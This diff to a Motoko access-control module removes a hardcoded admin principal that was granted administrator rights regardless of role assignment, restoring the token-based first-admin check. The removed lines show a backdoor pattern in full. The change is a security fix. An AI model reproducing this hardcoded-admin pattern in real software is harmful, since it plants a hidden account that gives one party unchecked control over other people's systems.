@@ -21,24 +21,13 @@ module {
     };
   };
 
-  // Hardcoded admin principal -- always recognized as admin regardless of role assignment
-  let HARDCODED_ADMIN : Text = "5pqb3-dmqi4-pavqv-kl4fx-6wm5l-kz534-h2qfy-jwhqt-clxy3-moe4q-6ae";
-
-  func isHardcodedAdmin(caller : Principal) : Bool {
-    caller.toText() == HARDCODED_ADMIN;
-  };
-
   // First principal that calls this function becomes admin, all other principals become users.
   public func initialize(state : AccessControlState, caller : Principal, adminToken : Text, userProvidedToken : Text) {
     if (caller.isAnonymous()) { return };
     switch (state.userRoles.get(caller)) {
       case (?_) {};
       case (null) {
-        if (isHardcodedAdmin(caller)) {
-          // Hardcoded admin always gets admin role
-          state.userRoles.add(caller, #admin);
-          state.adminAssigned := true;
-        } else if (not state.adminAssigned and userProvidedToken == adminToken) {
+        if (not state.adminAssigned and userProvidedToken == adminToken) {
           state.userRoles.add(caller, #admin);
           state.adminAssigned := true;
         } else {
@@ -50,8 +39,6 @@ module {
 
   public func getUserRole(state : AccessControlState, caller : Principal) : UserRole {
     if (caller.isAnonymous()) { return #guest };
-    // Hardcoded admin is always admin even if not in the map
-    if (isHardcodedAdmin(caller)) { return #admin };
     switch (state.userRoles.get(caller)) {
       case (?role) { role };
       case (null) {
@@ -75,8 +62,6 @@ module {
   };
 
   public func isAdmin(state : AccessControlState, caller : Principal) : Bool {
-    // Hardcoded admin is always admin
-    if (isHardcodedAdmin(caller)) { return true };
     getUserRole(state, caller) == #admin;
   };
 };
